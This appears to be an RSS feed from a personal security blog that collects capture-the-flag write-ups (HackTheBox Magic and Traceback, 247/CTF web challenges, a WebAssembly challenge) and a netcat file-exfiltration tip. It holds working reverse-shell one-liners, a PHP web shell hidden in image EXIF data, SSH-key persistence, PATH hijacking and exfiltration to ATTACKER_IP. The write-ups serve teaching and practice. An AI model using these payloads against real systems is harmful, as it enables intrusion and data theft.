Write-up"></figure><p>And we get our flag: <code>flag{g3lat1na_r0y4l_m0raNg0}</code>.</p>]]></content:encoded></item><item><title><![CDATA[HTB Write-up | Magic]]></title><description><![CDATA[<p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/241">here</a>.</em></p><h2 id="scanning">Scanning</h2><p>As always, we start with some basic scanning which discloses only an instance of <code>OpenSSH</code> running on port 22 and an <code>Apache</code> web server running on port 80 - pretty typical stuff.</p><!--kg-card-begin: markdown--><pre><code>~ nmap -sV -sC -A magic.htb
+Starting Nmap 7.80 ( https:</code></pre>]]></description><link>https://inesmartins.github.io//dnp-htb-write-up/</link><guid isPermaLink="false">5edf98963d00be7291b53615</guid><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Thu, 27 Aug 2020 12:14:17 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/08/magic.png" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io//content/images/2020/08/magic.png" alt="HTB Write-up | Magic"><p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/241">here</a>.</em></p><h2 id="scanning">Scanning</h2><p>As always, we start with some basic scanning which discloses only an instance of <code>OpenSSH</code> running on port 22 and an <code>Apache</code> web server running on port 80 - pretty typical stuff.</p><!--kg-card-begin: markdown--><pre><code>~ nmap -sV -sC -A magic.htb
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-09 15:10 WEST
+Nmap scan report for magic.htb (10.10.10.185)
+Host is up (0.046s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
+|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
+|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Magic Portfolio
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.89 seconds
+</code></pre>
+<!--kg-card-end: markdown--><p>The website is just a simple image gallery, but there is a link to a login form on the bottom left.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/main-1.png" class="kg-image" alt="HTB Write-up | Magic"></figure><p>Bypassing authentication was pretty straightforward with <a href="https://owasp.org/www-community/attacks/SQL_Injection">SQL Injection</a> - I think this was my first attempt.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/login-5.png" class="kg-image" alt="HTB Write-up | Magic"></figure><p>Once the login succeeds, we're redirected to an <a href="http://10.10.10.185/upload.php">Upload</a> page.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/upload.png" class="kg-image" alt="HTB Write-up | Magic"></figure><h2 id="bypassing-upload-filters">Bypassing Upload Filters</h2><p>This upload feature only accepts JPG, JPEG or PNG files. This is validated by checking both file extension and MIME type, so uploading a PHP script directly is out of the question. </p><p>To get around these restrictions I ended up following <a href="https://medium.com/bugbountywriteup/hackthebox-networked-93ebbd6a70e3">this</a> tutorial:</p><ol><li>Create a script that lets us execute any command on the machine, with the help of the <a href="https://www.php.net/manual/en/function.passthru.php">passthru</a> function:</li></ol><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://inesmartins.github.io//content/images/2020/06/image-21.png" class="kg-image" alt="HTB Write-up | Magic"><figcaption>Source: <a href="https://medium.com/bugbountywriteup/hackthebox-networked-93ebbd6a70e3">https://medium.com/bugbountywriteup/hackthebox-networked-93ebbd6a70e3</a></figcaption></figure><p>2. Embed the script in a valid image using <a href="http://steghide.sourceforge.net/">steghide</a>:</p><!--kg-card-begin: markdown--><pre><code>$ steghide embed -cf dog.jpg -ef shell.php
+</code></pre>
+<!--kg-card-end: markdown--><p>3. Manipulate the EXIF data:</p><!--kg-card-begin: markdown--><pre><code>$ exiftool -Comment='&lt;?php echo &quot;&lt;pre&gt;&quot;; system($_GET['cmd']); ?&gt;' dog.jpg
+</code></pre>
+<!--kg-card-end: markdown--><p>4. Change the file extension:</p><!--kg-card-begin: markdown--><pre><code>$ mv dog.jpg dog.php.jpg
+</code></pre>
+<!--kg-card-end: markdown--><p>Finally, we get an RCE, which we use to get a reverse shell:</p><!--kg-card-begin: markdown--><pre><code>http://10.10.10.185/images/uploads/dog.php.jpg?cmd=./nc%2010.10.15.114%204444%20-e%20/bin/sh
+</code></pre>
+<!--kg-card-end: markdown--><h2 id="getting-user">Getting User</h2><p>Authenticated as <code>wwwdata</code>, we start poking around the web server files and find the credentials for the mySQL database, which then allows us to dump the contents of the app's database using the <a href="https://dev.mysql.com/doc/refman/8.0/en/mysqldump.html">mysqldump</a> binary:</p><!--kg-card-begin: markdown--><pre><code>~ /usr/bin/mysqldump --user=theseus --password=iamkingtheseus Magic login &gt; /var/www/Magic/dbdump.sql
+
+~ cat /var/www/Magic/dbdump.sq
+...
+INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
+...
+</code></pre>
+<!--kg-card-end: markdown--><p>We now have credentials for the user <code>theseus</code> but need to upgrade our shell to be able to authenticate, since SSH access is only enabled with RSA.</p><!--kg-card-begin: markdown--><pre><code>http://10.10.10.185/images/uploads/dog.php.jpg?cmd=/usr/bin/python3 -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.52&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/bash&quot;)'
+</code></pre>
+<!--kg-card-end: markdown--><p>With this interactive shell we can now authenticate via <code>su</code>.</p><!--kg-card-begin: markdown--><pre><code>www-data@ubuntu:/var/www/Magic/images/uploads$ su - theseus
+Password: Th3s3usW4sK1ng
+theseus@ubuntu:~$ </code></pre>
+<!--kg-card-end: markdown--><h2 id="path-to-root">Path to Root</h2><p>Root was a lot more straightforward. We started by running <a href="https://github.com/Anon-Exploiter/SUID3NUM">SUID3NUM</a> which found only one noteworthy file - <code>/bin/sysinfo</code> - so we investigate it.</p><!--kg-card-begin: markdown--><pre><code>~ strings /bin/sysinfo
+...
+setuid
+...
+====================Hardware Info====================
+lshw -short
+...
+</code></pre>
+<!--kg-card-end: markdown--><p>As we can see above, the file runs <a href="https://en.wikipedia.org/wiki/Setuid">setuid</a> at one point and right after it prints the output of the <a href="http://manpages.ubuntu.com/manpages/trusty/man1/lshw.1.html">lshw</a> (list hardware) binary. However, there is no path to this binary, which means we can alter the <code>$PATH</code> so that instead of the actual <code>lshw</code> binary, we can get root to run our fake <code>lshw</code>, which prints out the root flag:</p><!--kg-card-begin: markdown--><pre><code>theseus@ubuntu:~$ mkdir /tmp/.abc
+theseus@ubuntu:~$ export PATH=/tmp/.abc:$PATH
+theseus@ubuntu:~$ touch /tmp/.abc/lshw
+theseus@ubuntu:~$ echo &quot;cat /root/root.txt&quot; &gt;&gt; /tmp/.abc/lshw
+theseus@ubuntu:~$ chmod 777 /tmp/.abc/lshw
+</code></pre>
+<!--kg-card-end: markdown--><p>Now, we just need to run the <code>sysinfo</code> binary and in the output there's the root flag instead of the <code>lshw</code> output.</p>]]></content:encoded></item><item><title><![CDATA[HTB Write-up | Traceback]]></title><description><![CDATA[<p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/233">here</a>.</em></p><h2 id="scanning">Scanning</h2><p>The scanning gives us very little: an instance of OpenSSH running on port 22 and an Apache server running on port 80 with the title "Help us".</p><!--kg-card-begin: markdown--><pre><code>~ nmap -sV -sC -A traceback.htb
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-13 22:</code></pre>]]></description><link>https://inesmartins.github.io//htb-write-up-traceback/</link><guid isPermaLink="false">5ee54aef3d00be7291b542b6</guid><category><![CDATA[htb]]></category><category><![CDATA[smevk]]></category><category><![CDATA[lua]]></category><category><![CDATA[cron]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Thu, 27 Aug 2020 12:14:04 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/06/traceback-1.png" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io//content/images/2020/06/traceback-1.png" alt="HTB Write-up | Traceback"><p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/233">here</a>.</em></p><h2 id="scanning">Scanning</h2><p>The scanning gives us very little: an instance of OpenSSH running on port 22 and an Apache server running on port 80 with the title "Help us".</p><!--kg-card-begin: markdown--><pre><code>~ nmap -sV -sC -A traceback.htb
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-13 22:58 WEST
+Nmap scan report for 10.10.10.181
+Host is up (0.040s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
+|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
+|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Help us
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.99 seconds
+</code></pre>
+<!--kg-card-end: markdown--><p>The website is also very simple, there's only one page with the following text:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/trackeback_main.png" class="kg-image" alt="HTB Write-up | Traceback"></figure><p>Looking at the source code we see some additional information: </p><!--kg-card-begin: markdown--><pre><code>&lt;h1&gt;This site has been owned&lt;/h1&gt;
+&lt;h2&gt;I have left a backdoor for all the net. FREE INTERNETZZZ&lt;/h2&gt;
+&lt;h3&gt; - Xh4H - &lt;/h3&gt;
+&lt;!--Some of the best web shells that you might need ;)--&gt;
+</code></pre>
+<!--kg-card-end: markdown--><p>After some googling we see that the phrase "Some of the best web shells that you might need" is taken from the Github repo for the <a href="https://github.com/Xh4H/Web-Shells">Web-Shells project</a>. </p><p>This project contains multiple scripts and so I created a very simple Python script to test if any of these produced any result:</p><pre><code class="language-python">import os
+
+shells=["alfa3.php", "alfav3.0.1.php", "andela.php", "bloodsecv4.php", "by.php", "c99ud.php", "cmd.php", "configkillerionkros.php", "jspshell.jsp", "mini.php", "obfuscated-punknopass.php", "punk-nopass.p$
+for shell in shells:
+  print(shell)
+  res = os.system("curl http://traceback.htb:80/" + shell)
+  print(res)</code></pre><p>The only script that doesn't return 404 is <a href="https://inesmartins.github.io//p/791ca428-2df4-4f4f-8b65-7e7defda57e3/traceback.htb/smevk.php">smevk</a>:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/smevk.png" class="kg-image" alt="HTB Write-up | Traceback"></figure><p>Looking at <a href="https://github.com/Xh4H/Web-Shells/blob/master/smevk.php">the shell's source code on Github</a>, we see that the default credentials are <code>admin/admin</code>, and so we used them to authenticate.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/authed.png" class="kg-image" alt="HTB Write-up | Traceback"></figure><p>smevk is basically a GUI that enables us to interact with the system as the user <code>webadmin</code>.</p><h2 id="practicing-our-lua">Practicing our LUA</h2><p>On the user's <code>home</code> directory we find a bunch of files in the <a href="http://www.lua.org/">Lua programming language</a> and a note:</p><!--kg-card-begin: markdown--><pre><code>- sysadmin -
+I have left a tool to practice Lua.
+I'm sure you know where to find it.
+Contact me if you have any question.
+</code></pre>
+<!--kg-card-end: markdown--><p>Running <code>sudo -l</code> we realise that the user is able to run the <code>luvit</code> binary as sudo:</p><!--kg-card-begin: markdown--><pre><code>$ sudo -l
+Matching Defaults entries for webadmin on traceback:
+  env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User webadmin may run the following commands on traceback:
+  (sysadmin) NOPASSWD: /home/sysadmin/luvit
+```</code></pre>
+<!--kg-card-end: markdown--><p>So, we go to the console interface and run the binary as sudo:</p><!--kg-card-begin: markdown--><pre><code>~ sudo -u sysadmin /home/sysadmin/luvit
+Welcome to the [0mL[0muv[0mit[0m repl!&gt;
+</code></pre>
+<!--kg-card-end: markdown--><p>According to its <a href="https://github.com/develephant/luvit-docs/wiki/repl">documentation</a>, this REPL can run a .lua file passed as an argument. So, we create a .lua file that prints the user flag:</p><pre><code class="language-Lua">print(os.execute("cat /home/sysadmin/user.txt"))</code></pre><p>and then run it as sudo:</p><!--kg-card-begin: markdown--><p><code>$ sudo -u sysadmin /home/sysadmin/luvit test.lua</code></p>
+<!--kg-card-end: markdown--><h2 id="gaining-persistency-as-sysadmin">Gaining persistency as sysadmin</h2><p>We start by generating a new RSA key pair:</p><p><code>~ ssh-keygen -t rsa</code><br><br>2. Then we modify the <code>test.lua</code> file we had previously created to add the public key to sysadmin's <code>authorized_keys</code>:</p><pre><code class="language-Lua">os.execute("echo ssh-rsa [PUBLIC_KEY] &gt;&gt; /home/sysadmin/.ssh/authorized_keys")
+</code></pre><p>and run the <code>test.lua</code> file just as before:</p><p><code>$ sudo -u sysadmin /home/sysadmin/luvit test.lua</code></p><p>3. Now we can access via SSH.</p><!--kg-card-begin: markdown--><pre><code>~ ssh -i key_rsa sysadmin@traceback.htb
+
+#################################
+-------- OWNED BY XH4H ---------
+- I guess stuff could have been configured better ^^ -
+#################################
+
+Welcome to Xh4H land
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Sat May 2 03:04:40 2020 from 10.10.14.114
+$
+</code></pre>
+<!--kg-card-end: markdown--><h2 id="getting-root">Getting root</h2><p>Looking at the processes, we see that these operations are occurring periodically:</p><!--kg-card-begin: markdown--><pre><code>$ ps aux
+...
+root                13:41           /usr/sbin/CRON -f
+root                13:41           /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/
+root                13:41           sleep 30
+...
+</code></pre>
+<!--kg-card-end: markdown--><p>It seems like there's a 30-second period after the copy operation during which we can modify the files in the <code>/etc/update-motd.d</code> directory, and these modified files will then run as root when a user logs into the system.</p><p>This means we can have the system display the <code>root.txt</code> flag on the greeting message, as such:</p><!--kg-card-begin: markdown--><p><code>$ echo &quot;cat /root/root.txt&quot; &gt;&gt; /etc/update-motd.d/00-header</code></p>
+<!--kg-card-end: markdown--><p>Then we can simply re-authenticate via SSH:</p><!--kg-card-begin: markdown--><pre><code>$ exit
+
+$ ssh -i key_rsa sysadmin@traceback.htb
+#################################
+-------- OWNED BY XH4H ---------
+- I guess stuff could have been configured better ^^ -
+#################################
+
+Welcome to Xh4H land
+
+[ROOT_FLAG]
+</code></pre>
+<!--kg-card-end: markdown--><p>Hope you enjoyed it! :)</p>]]></content:encoded></item><item><title><![CDATA[Downloading files from reverse shells using netcat]]></title><description><![CDATA[<p><em>Banner source: </em><a href="https://www.newyorker.com/culture/onward-and-upward-in-the-garden/the-lost-art-of-stealing-fruit">https://www.newyorker.com/culture/onward-and-upward-in-the-garden/the-lost-art-of-stealing-fruit</a></p><p>It's very common that I'm working with a reverse shell and can't use <code>scp</code> to upload or download files, which leads me to Googling this <code>netcat</code> syntax. Well, no more!</p><p>On the remote shell:</p><pre><code>~ nc -w 3 ATTACKER_IP ATTACKER_PORT</code></pre>]]></description><link>https://inesmartins.github.io//how-to-dowload-files-from-reverse-shells-on-macos/</link><guid isPermaLink="false">5f076c7f1e7da103a083f16d</guid><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Thu, 09 Jul 2020 19:18:37 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/07/Mendelson-The-Lost-Art-of-Stealing-Fruit.jpg" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io//content/images/2020/07/Mendelson-The-Lost-Art-of-Stealing-Fruit.jpg" alt="Downloading files from reverse shells using netcat"><p><em>Banner source: </em><a href="https://www.newyorker.com/culture/onward-and-upward-in-the-garden/the-lost-art-of-stealing-fruit">https://www.newyorker.com/culture/onward-and-upward-in-the-garden/the-lost-art-of-stealing-fruit</a></p><p>It's very common that I'm working with a reverse shell and can't use <code>scp</code> to upload or download files, which leads me to Googling this <code>netcat</code> syntax. Well, no more!</p><p>On the remote shell:</p><pre><code>~ nc -w 3 ATTACKER_IP ATTACKER_PORT &lt; [file_to_download]</code></pre><p>Note that <code>-w 3</code> sets a 3-second timeout for this operation.</p><p>Then, on the attacker machine:</p><pre><code>~ nc -l ATTACKER_PORT &gt; [output_file_path]</code></pre><p>Thanks folks!</p>]]></content:encoded></item><item><title><![CDATA[247/CTF Write-up | Web Challenges]]></title><description><![CDATA[<p>This post will be updated as I solve more of the <a href="https://247ctf.com/dashboard">247/CTF platform</a>'s web challenges.</p><h2 id="1-trusted-client">1. Trusted Client</h2><blockquote>Developers don't always have time to setup a backend service when prototyping code<em>.</em> Storing credentials on the client side should be fine as long as it's obfuscated right?</blockquote><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://inesmartins.github.io//content/images/2020/06/jsfuck.png" class="kg-image"><figcaption>snapshot from</figcaption></figure>]]></description><link>https://inesmartins.github.io//247-ctf-web-write-up/</link><guid isPermaLink="false">5ef865c81e7da103a083e681</guid><category><![CDATA[247ctf]]></category><category><![CDATA[ctf]]></category><category><![CDATA[jwt]]></category><category><![CDATA[jsfuck]]></category><category><![CDATA[javascript]]></category><category><![CDATA[md5]]></category><category><![CDATA[php]]></category><category><![CDATA[magic hashes]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sun, 28 Jun 2020 10:47:34 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/06/ctf.png" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io//content/images/2020/06/ctf.png" alt="247/CTF Write-up | Web Challenges"><p>This post will be updated as I solve more of the <a href="https://247ctf.com/dashboard">247/CTF platform</a>'s web challenges.</p><h2 id="1-trusted-client">1. Trusted Client</h2><blockquote>Developers don't always have time to setup a backend service when prototyping code<em>.</em> Storing credentials on the client side should be fine as long as it's obfuscated right?</blockquote><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://inesmartins.github.io//content/images/2020/06/jsfuck.png" class="kg-image" alt="247/CTF Write-up | Web Challenges"><figcaption>snapshot from the source code</figcaption></figure><p>Yup, this is <a href="https://en.wikipedia.org/wiki/JSFuck">JSFuck</a>. I used an <a href="http://codertab.com/jsunfuck">online decoder</a> to get the original JS code:</p><pre><code class="language-javascript">function anonymous() {
+	if (this.username.value == 'the_flag_is' &amp;&amp; this.password.value == '247CTF{6c91b7f7f12c852f892293d16dba0148}') { 
+        alert('Valid username and password!');
+    } else { alert('Invalid username and password!'); }
+}</code></pre><p>Note that some of the online decoders out there are a little buggy, take a look at the console, it might help.</p><hr><h2 id="2-secured-session">2. Secured Session</h2><blockquote>If you can guess our random secret key, we will tell you the flag securely stored in your session.</blockquote><pre><code class="language-python">import os
+from flask import Flask, request, session
+from flag import flag
+
+app = Flask(__name__)
+app.config['SECRET_KEY'] = os.urandom(24)
+
+def secret_key_to_int(s):
+    try:
+        secret_key = int(s)
+    except ValueError:
+        secret_key = 0
+    return secret_key
+
+@app.route("/flag")
+def index():
+    secret_key = secret_key_to_int(request.args['secret_key']) if 'secret_key' in request.args else None
+    session['flag'] = flag
+    if secret_key == app.config['SECRET_KEY']:
+      return session['flag']
+    else:
+      return "Incorrect secret key!"
+
+@app.route('/')
+def source():
+    return "
+%s
+" % open(__file__).read()
+
+if __name__ == "__main__":
+    app.run()</code></pre><p>So, it seems that as long as we send a non-null <code>secret_key</code> parameter, the flag is written to the <code>flag</code> property of the <code>session</code> cookie. Let's confirm this:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/size.png" class="kg-image" alt="247/CTF Write-up | Web Challenges"></figure><p>As you can see, the <code>session</code> cookie is a <a href="https://en.wikipedia.org/wiki/JSON_Web_Token">JWT</a>, which we can <a href="https://jwt.io/">reverse</a>:</p><pre><code>{
+  "flag": {
+    " b": "MjQ3Q1RGe2RhODA3OTVmOGE1Y2FiMmUwMzdkNzM4NTgwN2I5YTkxfQ=="
+  }
+}</code></pre><p>Decoding the base64 string we get: <code>247CTF{da80795f8a5cab2e037d7385807b9a91}</code>.</p><hr><h2 id="3-compare-the-pair">3. Compare the pair</h2><blockquote>Can you identify a way to bypass our login logic? MD5 is supposed to be a one-way function right?</blockquote><pre><code class="language-php">&lt;?php
+  require_once('flag.php');
+  $password_hash = "0e902564435691274142490923013038";
+  $salt = "f789bbc328a3d1a3";
+  if(isset($_GET['password']) &amp;&amp; md5($salt . $_GET['password']) == $password_hash) {
+    echo $flag;
+  }
+  echo highlight_file(__FILE__, true);
+?&gt;</code></pre><p>Whenever I find a <code>MD5</code> hash in the wild I google it just in case someone already found the plaintext in another context, however, with this one the only matches that came up were related to this CTF.</p><p>Since the <code>MD5</code> algorithm is not reversible, it's clear that we're not supposed to try and extract the original password logically. After some research I realised that the solution lies in exploiting the "<a href="https://www.whitehatsec.com/blog/magic-hashes/">Magic hashes</a>" vulnerability that has long been identified in PHP.</p><blockquote>Password hashes in PHP are base16 encoded and can come in the form of “0e812389…”. The problem is in <code>==</code> comparison the <code>0e</code> means that if the following characters are all digits the whole string gets treated as a float. [<a href="https://www.whitehatsec.com/blog/magic-hashes/">Source</a>]</blockquote><p>Even more strange:</p><blockquote>If PHP decides that both operands look like numbers, even if they are actually strings, it will convert them both and perform a numeric comparison:<br> <code>TRUE: "0e12345" == "0e54321"</code><br>[<a href="https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf">Source</a>]</blockquote><p>So, all we have to do is find the group of characters that when concatenated with the salt and hashed is equal to <code>0e902564435691274142490923013038</code>. Let's create a script that does exactly that:</p><pre><code class="language-php">&lt;?php
+
+$password_hash = "0e902564435691274142490923013038";
+$salt = "f789bbc328a3d1a3";
+
+for ($i = 0; $i &lt; 1000000000; $i++) {
+    $tmp_pwd = $salt . $i;
+    $tmp_pwd_hash = md5($tmp_pwd);
+    if ($tmp_pwd_hash == $password_hash) {
+    	echo "Match!: " . $tmp_pwd . "\n";
+        return;
+    }
+}
+
+?&gt;</code></pre><p>And we find a match! <code>f789bbc328a3d1a3237701818</code>. </p><p>If we remove the salt - <code>f789bbc328a3d1a3</code> we get a password that works: <code>237701818</code>. </p><p>Let's try it out!</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/final.png" class="kg-image" alt="247/CTF Write-up | Web Challenges"></figure><h2 id="4-forgotten-file-pointer">4. Forgotten File Pointer</h2><blockquote>We have opened the flag, but forgot to read and print it. Can you access it anyway?</blockquote><pre><code class="language-php">&lt;?php
+  $fp = fopen("/tmp/flag.txt", "r");
+  if($_SERVER['REQUEST_METHOD'] === 'GET' &amp;&amp; isset($_GET['include']) &amp;&amp; strlen($_GET['include']) &lt;= 10) {
+    include($_GET['include']);
+  }
+  fclose($fp);
+  echo highlight_file(__FILE__, true);
+?&gt;</code></pre><p>So, clearly, we need to add an <code>include</code> parameter to the page <code>GET</code> request that has a value under 10 chars, and that somehow lets us print the content of the <code>fp</code> stream, for example something like:</p><pre><code class="language-php">echo fread($fp)</code></pre><p>After toying with the idea of hosting this code on a remote host with a <em>very</em> short URL (and failing miserably), I ended up having to check <a href="https://hackmd.io/@Chivato/rkj-Y1GVI">this write-up</a> in order to get to the solution. </p><p>The solution is actually pretty simple: on Linux systems, every time you create a stream in order to read a file using <code>fopen</code> you're also creating a <a href="https://en.wikipedia.org/wiki/File_descriptor">file descriptor</a> which is basically a file hosted at <code>/dev/fd/</code> that can be passed to the <code>include</code> function.</p><p>File descriptors are identified by a sequential number and we don't know which number matches this file, however, we can simply brute-force the answer:</p><pre><code class="language-python">import os
+
+for i in range(0, 100):
+    print("Testing file descriptor " + str(i))
+    os.system("curl -s https://[custom_247ctf_subdomain].247ctf.com/?include=/dev/fd/" + str(i) + " &gt;&gt; output.txt")</code></pre><p>After looking at the output file, we get our flag!</p>]]></content:encoded></item><item><title><![CDATA[Web Assembly CTF Write-up]]></title><description><![CDATA[<p><em>Banner source: <a href="https://medium.com/trainingcenter/webassembly-a-jornada-o-que-%C3%A9-wasm-75e3f0f03124">https://medium.com/trainingcenter/webassembly-a-jornada-o-que-%C3%A9-wasm-75e3f0f03124</a></em></p><p>I'm been trying to get into Web Assembly for a while, so when I found <a href="https://medium.com/@cyjien/misc-js-scripting-ctf-writeup-ae74b45cb2c0">this CTF write-up</a> by Chiam YJ I decided to give it a try.</p><h1 id="the-original-challenge">The original Challenge</h1><pre><code class="language-javascript">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;</code></pre>]]></description><link>https://inesmartins.github.io//js-wasm-ctf-write-up/</link><guid isPermaLink="false">5ef27a571e7da103a083e133</guid><category><![CDATA[web-assembly]]></category><category><![CDATA[wasm]]></category><category><![CDATA[ctf]]></category><category><![CDATA[write-up]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Tue, 23 Jun 2020 22:00:44 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/06/1_f__SEWRvsNwt4B-u8-85Bw.png" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io//content/images/2020/06/1_f__SEWRvsNwt4B-u8-85Bw.png" alt="Web Assembly CTF Write-up"><p><em>Banner source: <a href="https://medium.com/trainingcenter/webassembly-a-jornada-o-que-%C3%A9-wasm-75e3f0f03124">https://medium.com/trainingcenter/webassembly-a-jornada-o-que-%C3%A9-wasm-75e3f0f03124</a></em></p><p>I'm been trying to get into Web Assembly for a while, so when I found <a href="https://medium.com/@cyjien/misc-js-scripting-ctf-writeup-ae74b45cb2c0">this CTF write-up</a> by Chiam YJ I decided to give it a try.</p><h1 id="the-original-challenge">The original Challenge</h1><pre><code class="language-javascript">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;meta charset="utf-8"/&gt;
+    &lt;title&gt;crypto&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;/body&gt;
+&lt;script type="text/javascript"&gt;
+    var bin = new Uint8Array([0,97,115,109,1,0,0,0,1,138,128,128,128,0,2,96,0,1,127,96,1,127,1,127,3,131,128,128,128,0,2,0,1,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,163,128,128,128,0,3,6,109,101,109,111,114,121,2,0,14,103,101,116,73,110,83,116,114,79,102,102,115,101,116,0,0,5,109,111,114,112,104,0,1,10,148,129,128,128,0,2,132,128,128,128,0,0,65,16,11,133,129,128,128,0,1,6,127,2,64,32,0,65,1,72,13,0,65,0,33,3,3,64,32,3,65,208,0,106,34,1,32,3,65,16,106,45,0,0,34,4,58,0,0,2,64,32,3,65,1,72,13,0,65,0,33,5,32,3,33,6,2,64,3,64,32,4,32,6,65,15,106,45,0,0,115,33,4,32,6,65,2,72,13,1,32,6,65,127,106,33,6,32,5,65,4,72,33,2,32,5,65,1,106,33,5,32,2,13,0,11,11,32,1,32,4,58,0,0,11,32,3,65,1,106,34,3,32,0,71,13,0,11,11,65,208,0,11]);
+    var m = new WebAssembly.Instance(new WebAssembly.Module(bin));
+    var offset = m.exports.getInStrOffset();
+    var flag = prompt("teh flag?");
+	  var strBuf = new TextEncoder().encode(flag.slice(0, 64));
+	  var inBuf = new Uint8Array(m.exports.memory.buffer, offset, strBuf.length);
+	  for (let i = 0; i &lt; strBuf.length; i++) {
+        inBuf[i] = strBuf[i];
+    }
+	  var morph = m.exports.morph(strBuf.length);	
+    var outBuf = new Uint8Array(m.exports.memory.buffer, morph, strBuf.length);
+
+    if (btoa(new TextDecoder().decode(outBuf)) === "dxB9BH8RVRMKG1NPI3UyOFRIJyJObAZdXkF8DUEJ") {
+        document.write("congratz!");
+    } else {
+        document.write("nope!");
+    }
+&lt;/script&gt;
+&lt;/html&gt;
+</code></pre><h1 id="static-code-analysis">Static Code Analysis</h1><p>We can divide the code into major sections:</p><h3 id="1-compiling-and-loading-the-binary-code">1. Compiling and Loading the binary Code</h3><p>A <code>WebAssembly.Instance</code> object is a stateful, executable instance of a <code>WebAssembly.Module</code> that contains all the <a href="https://developer.mozilla.org/en-US/docs/WebAssembly/Exported_functions">Exported WebAssembly functions</a>. </p><p>In this case, we're creating a new <code>WebAssembly.Instance</code> object (<code>m</code>) that contains all the Exported WebAssembly functions that derive from the compilation of the bytes in the <code>bin</code> byte array.</p><pre><code class="language-javascript">var bin = new Uint8Array([0,97,115,109,1,0,0,0,1,...]);
+var m = new WebAssembly.Instance(new WebAssembly.Module(bin));)]</code></pre><h3 id="2-encoding-transforming-the-user-input">2. Encoding/Transforming the User Input</h3><p>First, this script starts by converting the first 64 characters introduced by the user into bytes and then writes them to <code>strBuf</code> .</p><pre><code class="language-javascript">var offset = m.exports.getInStrOffset();
+var flag = prompt("teh flag?");
